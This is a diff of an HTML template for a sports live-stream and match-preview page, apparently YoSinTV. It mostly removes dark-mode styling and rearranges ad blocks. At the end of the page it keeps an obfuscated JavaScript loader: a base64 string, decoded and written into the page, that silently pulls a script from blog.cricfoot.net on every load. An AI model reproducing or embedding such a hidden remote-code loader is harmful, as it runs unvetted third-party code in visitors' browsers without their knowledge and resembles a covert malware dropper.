@@ -13,24 +13,13 @@
   <link rel="canonical" id="canonical-url" href="" />
   <link href="https://web.cricfoot.net/favico.png" rel="icon" type="image/x-icon" />
   <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
-  <script src="https://cdn.tailwindcss.com"></script>
-
   <title>YoSinTV - Cricket | Football | Playing XI | Match Preview</title>
 </head>
-<body class="bg-gray-100 font-sans text-gray-900 dark:bg-gray-900 dark:text-gray-100 transition-colors duration-300">
+<body class="bg-gray-100 font-sans text-gray-900">
   <div id="fb-root"></div>
-  <script>
-    /*<![CDATA[*/
-    (localStorage.getItem('mode')) === 'rdmode' ? document.querySelector('body').classList.add('dark') : document.querySelector('body').classList.remove('dark');
-    function rdmode() {
-      document.querySelector('body').classList.toggle('dark');
-      localStorage.setItem('mode', document.querySelector('body').classList.contains('dark') ? 'rdmode' : '');
-    }
-    /*]]>*/
-  </script>
 
   <!-- Header -->
-  <header class="bg-white shadow-sm dark:bg-gray-800">
+  <header class="bg-white shadow-sm">
     <div class="container mx-auto max-w-4xl px-4 py-4 flex items-center justify-between">
       <div class="flex items-center">
         <a href="https://www.yosin-tv.net/" title="YoSinTV">
@@ -54,7 +43,7 @@
 
   <!-- Main Content -->
   <main class="container mx-auto max-w-4xl px-4 py-8">
-    <section class="bg-white dark:bg-gray-800 rounded-lg shadow-md p-6 mb-6">
+    <section class="bg-white rounded-lg shadow-md p-6 mb-6">
       <div class="space-y-4">
         <p>● Watch the live of this match in HD Quality, Scroll down to check out every link for Smooth Live Stream of this match.</p>
         <p>● Predicted lineups are available for the match a few days in advance while the actual lineup will be available about an hour ahead of the match.</p>
@@ -72,7 +61,7 @@
       </div>
     </section>
 
-    <section class="bg-white dark:bg-gray-800 rounded-lg shadow-md p-6">
+    <section class="bg-white rounded-lg shadow-md p-6">
       <div id="match-info"></div>
     </section>
   </main>
@@ -157,43 +146,43 @@
         document.getElementById('twitter-description').content = `Watch ${team1} vs ${team2} live stream on YoSinTV, your source for ${leagueTitle} matches.`;
         document.getElementById('canonical-url').href = window.location.href;
         const progressContainer = document.createElement('div');
-        progressContainer.className = 'w-full bg-gray-200 rounded-full h-4 mb-4 dark:bg-gray-700';
+        progressContainer.className = 'w-full bg-gray-200 rounded-full h-4 mb-4';
         const progressBar = document.createElement('div');
         progressBar.className = 'bg-blue-600 h-4 rounded-full';
         const progressText = document.createElement('div');
-        progressText.className = 'text-sm text-gray-600 dark:text-gray-400 mb-2';
+        progressText.className = 'text-sm text-gray-600 mb-2';
         progressContainer.appendChild(progressBar);
         const content = document.createElement('div');
         content.className = 'space-y-4 text-left';
         content.innerHTML = `
-          <h3 class="text-3xl font-bold text-gray-900 dark:text-gray-100">${name} - Match Details</h3>
-          <p class="text-sm text-gray-600 dark:text-gray-400">Start: ${startTime}</p>
+          <h3 class="text-3xl font-bold text-gray-900">${name} - Match Details</h3>
+          <p class="text-sm text-gray-600">Start: ${startTime}</p>
           <div class="flex justify-center my-4"></div>
-          <h3 class="text-2xl font-bold border-b-2 border-gray-200 dark:border-gray-700 pb-2 text-gray-900 dark:text-gray-100">Frequently Asked Questions</h3>
+          <h3 class="text-2xl font-bold border-b-2 border-gray-200 pb-2 text-gray-900">Frequently Asked Questions</h3>
           <div class="space-y-4">
-            <div class="bg-gray-50 dark:bg-gray-700 p-4 rounded-lg">
-              <h4 class="text-lg font-semibold text-gray-900 dark:text-gray-100">Which teams are playing in the ${name} match in ${leagueTitle}?</h4>
-              <p class="text-gray-600 dark:text-gray-400">${team1} will face off against ${team2} in this exciting ${leagueTitle} match.</p>
+            <div class="bg-gray-50 p-4 rounded-lg">
+              <h4 class="text-lg font-semibold text-gray-900">Which teams are playing in the ${name} match in ${leagueTitle}?</h4>
+              <p class="text-gray-600">${team1} will face off against ${team2} in this exciting ${leagueTitle} match.</p>
             </div>
-            <div class="bg-gray-50 dark:bg-gray-700 p-4 rounded-lg">
-              <h4 class="text-lg font-semibold text-gray-900 dark:text-gray-100">When does the ${name} match start and where is it held?</h4>
-              <p class="text-gray-600 dark:text-gray-400">The match starts at ${startTime}. Visit the official ${leagueTitle} website for venue details.</p>
+            <div class="bg-gray-50 p-4 rounded-lg">
+              <h4 class="text-lg font-semibold text-gray-900">When does the ${name} match start and where is it held?</h4>
+              <p class="text-gray-600">The match starts at ${startTime}. Visit the official ${leagueTitle} website for venue details.</p>
             </div>
-            <div class="bg-gray-50 dark:bg-gray-700 p-4 rounded-lg">
-              <h4 class="text-lg font-semibold text-gray-900 dark:text-gray-100">How long is the ${name} match in ${leagueTitle}?</h4>
-              <p class="text-gray-600 dark:text-gray-400">The match is expected to last approximately ${duration} hours, including stoppage time.</p>
+            <div class="bg-gray-50 p-4 rounded-lg">
+              <h4 class="text-lg font-semibold text-gray-900">How long is the ${name} match in ${leagueTitle}?</h4>
+              <p class="text-gray-600">The match is expected to last approximately ${duration} hours, including stoppage time.</p>
             </div>
-            <div class="bg-gray-50 dark:bg-gray-700 p-4 rounded-lg">
-              <h4 class="text-lg font-semibold text-gray-900 dark:text-gray-100">Where can I watch the ${name} match live stream online?</h4>
-              <p class="text-gray-600 dark:text-gray-400">Stream the match live via the <a href="${link}" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline">official live stream</a>.</p>
+            <div class="bg-gray-50 p-4 rounded-lg">
+              <h4 class="text-lg font-semibold text-gray-900">Where can I watch the ${name} match live stream online?</h4>
+              <p class="text-gray-600">Stream the match live via the <a href="${link}" target="_blank" class="text-blue-600 hover:underline">official live stream</a>.</p>
             </div>
-            <div class="bg-gray-50 dark:bg-gray-700 p-4 rounded-lg">
-              <h4 class="text-lg font-semibold text-gray-900 dark:text-gray-100">Who are the key players in the ${name} match?</h4>
-              <p class="text-gray-600 dark:text-gray-400">Look out for star players from ${team1} and ${team2}. Check the ${leagueTitle} site for confirmed lineups.</p>
+            <div class="bg-gray-50 p-4 rounded-lg">
+              <h4 class="text-lg font-semibold text-gray-900">Who are the key players in the ${name} match?</h4>
+              <p class="text-gray-600">Look out for star players from ${team1} and ${team2}. Check the ${leagueTitle} site for confirmed lineups.</p>
             </div>
-            <div class="bg-gray-50 dark:bg-gray-700 p-4 rounded-lg">
-              <h4 class="text-lg font-semibold text-gray-900 dark:text-gray-100">What is the recent performance of ${team1} and ${team2} in ${leagueTitle}?</h4>
-              <p class="text-gray-600 dark:text-gray-400">Check the latest form guides and stats for ${team1} and ${team2} on the official ${leagueTitle} website.</p>
+            <div class="bg-gray-50 p-4 rounded-lg">
+              <h4 class="text-lg font-semibold text-gray-900">What is the recent performance of ${team1} and ${team2} in ${leagueTitle}?</h4>
+              <p class="text-gray-600">Check the latest form guides and stats for ${team1} and ${team2} on the official ${leagueTitle} website.</p>
             </div>
           </div>
         `;
@@ -242,39 +231,48 @@
   </script>
 
   <!-- Footer -->
-  <footer class="bg-white dark:bg-gray-800 shadow-inner py-6 mt-8">
+  <footer class="bg-white shadow-inner py-6 mt-8">
     <div class="container mx-auto max-w-4xl px-4">
       <ul class="flex flex-wrap justify-center space-x-4">
-        <li><a href="/" class="bg-gray-200 dark:bg-gray-700 px-4 py-2 rounded-md text-gray-700 dark:text-gray-200 hover:bg-blue-100 dark:hover:bg-blue-900">YoSinTV</a></li>
+        <li><a href="/" class="bg-gray-200 px-4 py-2 rounded-md text-gray-700 hover:bg-blue-100">YoSinTV</a></li>
       </ul>
     </div>
   </footer>
 
-
-<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-<div id='fixedban' class='fixed bottom-0 left-1/2 -translate-x-1/2 z-[999]'>
-    <div class='relative w-[300px] h-[250px] bg-white rounded-lg shadow-xl border border-gray-200'>
-        <button id='close-fixedban' class='absolute left-1/2 -translate-x-1/2 top-3 text-sm font-medium text-blue-600 hover:text-blue-800 transition-colors duration-200 cursor-pointer z-[1000]'>Close</button>
-        <div class='w-[300px] h-[250px] overflow-hidden pt-8'>
-            <ins class='adsbygoogle inline-block w-[300px] h-[250px]' data-ad-client='ca-pub-5525538810839147' data-ad-slot='5912194004'></ins>
-            <script>
-                (adsbygoogle = window.adsbygoogle || []).push({});
-            </script>
-        </div>
+  <!-- Ads -->
+  <div class="container mx-auto max-w-4xl px-4 py-4">
+    <div class="adspos">
+      <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-5525538810839147" crossorigin="anonymous"></script>
+      <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-5525538810839147" data-ad-slot="4345862479" data-ad-format="auto" data-full-width-responsive="true"></ins>
+      <script>
+        (adsbygoogle = window.adsbygoogle || []).push({});
+      </script>
     </div>
-</div>
-<script type='text/javascript'>
-    $(document).ready(function() {
-        $('#close-fixedban').click(function() {
-            $('#fixedban').hide(90);
-        });
-    });
-</script>
-  
-  
-  <script>
-const _0x5424b1=_0x4798;(function(_0x5a047e,_0x2e3b4b){const _0x57279f=_0x4798,_0x49e1fe=_0x5a047e();while(!![]){try{const _0x2cd49a=-parseInt(_0x57279f(0x151))/0x1*(parseInt(_0x57279f(0x14c))/0x2)+-parseInt(_0x57279f(0x14d))/0x3+-parseInt(_0x57279f(0x150))/0x4*(parseInt(_0x57279f(0x146))/0x5)+parseInt(_0x57279f(0x14f))/0x6+parseInt(_0x57279f(0x14e))/0x7+-parseInt(_0x57279f(0x147))/0x8*(parseInt(_0x57279f(0x145))/0x9)+-parseInt(_0x57279f(0x14a))/0xa*(-parseInt(_0x57279f(0x149))/0xb);if(_0x2cd49a===_0x2e3b4b)break;else _0x49e1fe['push'](_0x49e1fe['shift']());}catch(_0x47deee){_0x49e1fe['push'](_0x49e1fe['shift']());}}}(_0x474d,0x2ad8c));function _0x4798(_0x2ffa33,_0x6a2f71){const _0x474df9=_0x474d();return _0x4798=function(_0x4798f1,_0x5f5465){_0x4798f1=_0x4798f1-0x145;let _0x5b0406=_0x474df9[_0x4798f1];return _0x5b0406;},_0x4798(_0x2ffa33,_0x6a2f71);}const b64=_0x5424b1(0x14b);document[_0x5424b1(0x148)](atob(b64));function _0x474d(){const _0x2f0933=['809LWoqNb','971595qRSIpw','10lYzWOk','16kPwJdl','write','12639gmjqRL','2930tMKtkG','PHNjcmlwdCBzcmM9Imh0dHBzOi8vYmxvZy5jcmljZm9vdC5uZXQvYXBwLXRlc3QuanMiPjwvc2NyaXB0Pg==','654FEkzUs','140730BzXyzA','1471785seKKat','1084914ZqXUsu','49736amwPRT'];_0x474d=function(){return _0x2f0933;};return _0x474d();}
-</script>
+  </div>
 
+ <script src="https://cdn.tailwindcss.com"></script>
+ <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <div id='fixedban' class='fixed bottom-0 left-1/2 -translate-x-1/2 z-[999]'>
+    <div class='relative w-[300px] h-[250px] bg-white rounded-lg shadow-xl border border-gray-200'>
+      <button id='close-fixedban' class='absolute left-1/2 -translate-x-1/2 top-3 text-sm font-medium text-blue-600 hover:text-blue-800 transition-colors duration-200 cursor-pointer z-[1000]'>Close</button>
+      <div class='w-[300px] h-[250px] overflow-hidden pt-8'>
+        <ins class='adsbygoogle inline-block w-[300px] h-[250px]' data-ad-client='ca-pub-5525538810839147' data-ad-slot='5912194004'></ins>
+        <script>
+          (adsbygoogle = window.adsbygoogle || []).push({});
+        </script>
+      </div>
+    </div>
+  </div>
+  <script type='text/javascript'>
+    $(document).ready(function() {
+      $('#close-fixedban').click(function() {
+        $('#fixedban').hide(90);
+      });
+    });
+  </script>
+
+  <script>
+    const _0x5424b1=_0x4798;(function(_0x5a047e,_0x2e3b4b){const _0x57279f=_0x4798,_0x49e1fe=_0x5a047e();while(!![]){try{const _0x2cd49a=-parseInt(_0x57279f(0x151))/0x1*(parseInt(_0x57279f(0x14c))/0x2)+-parseInt(_0x57279f(0x14d))/0x3+-parseInt(_0x57279f(0x150))/0x4*(parseInt(_0x57279f(0x146))/0x5)+parseInt(_0x57279f(0x14f))/0x6+parseInt(_0x57279f(0x14e))/0x7+-parseInt(_0x57279f(0x147))/0x8*(parseInt(_0x57279f(0x145))/0x9)+-parseInt(_0x57279f(0x14a))/0xa*(-parseInt(_0x57279f(0x149))/0xb);if(_0x2cd49a===_0x2e3b4b)break;else _0x49e1fe['push'](_0x49e1fe['shift']());}catch(_0x47deee){_0x49e1fe['push'](_0x49e1fe['shift']());}}}(_0x474d,0x2ad8c));function _0x4798(_0x2ffa33,_0x6a2f71){const _0x474df9=_0x474d();return _0x4798=function(_0x4798f1,_0x5f5465){_0x4798f1=_0x4798f1-0x145;let _0x5b0406=_0x474df9[_0x4798f1];return _0x5b0406;},_0x4798(_0x2ffa33,_0x6a2f71);}const b64=_0x5424b1(0x14b);document[_0x5424b1(0x148)](atob(b64));function _0x474d(){const _0x2f0933=['809LWoqNb','971595qRSIpw','10lYzWOk','16kPwJdl','write','12639gmjqRL','2930tMKtkG','PHNjcmlwdCBzcmM9Imh0dHBzOi8vYmxvZy5jcmljZm9vdC5uZXQvYXBwLXRlc3QuanMiPjwvc2NyaXB0Pg==','654FEkzUs','140730BzXyzA','1471785seKKat','1084914ZqXUsu','49736amwPRT'];_0x474d=function(){return _0x2f0933;};return _0x474d();}
+  </script>
 </body>
 </html>
